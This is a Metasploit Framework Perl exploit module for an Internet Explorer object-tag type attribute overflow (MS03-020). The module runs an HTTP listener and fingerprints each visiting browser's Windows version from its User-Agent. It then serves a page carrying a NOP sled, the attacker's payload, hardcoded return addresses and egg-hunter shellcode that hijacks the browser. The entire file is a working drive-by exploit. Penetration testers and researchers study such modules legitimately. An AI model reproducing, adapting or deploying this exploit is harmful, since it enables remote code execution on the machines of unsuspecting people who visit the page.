
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_objecttype;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;

my $advanced =
{
};

my $info =
{
	'Name'           => 'Internet Explorer Object Type Overflow',
	'Version'        => '$Revision: 1.4 $',
	'Authors'        => 
		[
			'skape <mmiller [at] hick.org>'
		],
	'Description'    => 
		Pex::Text::Freeform(qq{
			This module exploits a vulnerability in Internet Explorer's
			parsing of the type attribute in object tags.
		}),
	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2003' ],
	'Priv'           => 0,
	'UserOpts'       => 
		{
			'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
			'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
		},
	'Payload'        => 
		{
			'Space'    => 1000,
			'MaxNops'  => 0,
			'Keys'     => [ '-ws2ord', '-bind' ],
		},
	'Refs'           => 
		[
			['OSVDB',    '2967' ],
			['MSB',  'MS03-020' ],
			['CVE', '2003-0344' ],

		],
	'DefaultTarget'  => 0,
	'Targets'        =>
		[
			# Target here
			[ 'Automatic - Windows NT 4.0, Windows XP, Windows 2003' ]
		],
	'Keys'           => [ 'ie', 'internal' ],
};

sub new
{
	my $class = shift;
	my $self;
	
	$self = $class->SUPER::new(
			{ 
				'Info'     => $info,
				'Advanced' => $advanced,
			},
			@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
			LocalHost => $self->GetVar('HTTPHOST'),
			LocalPort => $self->GetVar('HTTPPORT'),
			ReuseAddr => 1,
			Listen    => 1,
			Proto     => 'tcp');
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to http://" . $self->GetVar('HTTPHOST') . ":" . $self->GetVar('HTTPPORT') . " ...");

	while (defined($client = $server->accept()))
	{
		$self->HandleHttpClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $targetIdx = $self->GetVar('TARGET');
	my $target    = $self->Targets->[$targetIdx];
	my $ret       = $target->[1];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $content;
	my $rhost;
	my $rport;
	my $content;
	my $targets =
		{
			"Windows NT"   => [ 0x777e85ab, 0x7ffdec50 ], # samlib jmp esp ALL
			"Windows XP"   => [ 0x71ab1d54, 0x7ffdec50 ], # ws2_32 push esp/ret SP0/1
			"Windows 2003" => [ 0x77d1f92f, 0x7ffdec50 ]  # user32 jmp esp SP0/1
		};
	my $target;
	my $os;

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

	# Read in the HTTP headers
	while (my $line = $fd->RecvLine(10))
	{
		my ($var, $val) = split /: /, $line;

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		if ($var eq 'User-Agent')
		{
			$os = "Windows 2003" if (!$os and $val =~ /Windows NT 5.2/);
			$os = "Windows XP"   if (!$os and $val =~ /Windows NT 5.1/);
			$os = "Windows 2000" if (!$os and $val =~ /Windows NT 5.0/);
			$os = "Windows NT"   if (!$os and $val =~ /Windows NT/);
			$os = "Unknown"      if (!$os);
		}
	}

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);
	
	$target = $targets->{$os};
	
	if (! $target) {
	   $self->PrintLine("[*] Unsupported HTTP Client connected from $rhost:$rport using $os");
	   $fd->Close;
	   return;
	}

	# Build the HTML
	if (defined($target))
	{
		my $hunter = 
			"\x66\x81\xca\xff\x0f\x42\x52\x6a" .
		   	"\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x90\x50" .
			"\x90\x50\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";
			
		my $clean  = pack('V', $target->[1]);
		my $ret    = pack('V', $target->[0]);
		my $pad    = "\x90" x 8;

		$content = "
			<html>
				\x90\x50\x90\x50\x90\x50\x90\x50$shellcode
				<object type=\"////////////////////////////////////////////////////////////////owned:~($ret$clean$pad$hunter\">
				</object>
			</html>";
	}

	$self->PrintLine("[*] HTTP Client connected from $rhost:$rport using $os, sending payload...");
	
	# Transmit the HTTP response
	$fd->Send(
		"HTTP/1.1 200 OK\r\n" .
		"Content-Type: text/html\r\n" .
		"Content-Length: " . length($content) . "\r\n" .
		"Connection: close\r\n" .
		"\r\n" .
		"$content"
	);

	$fd->Close();
}

1;
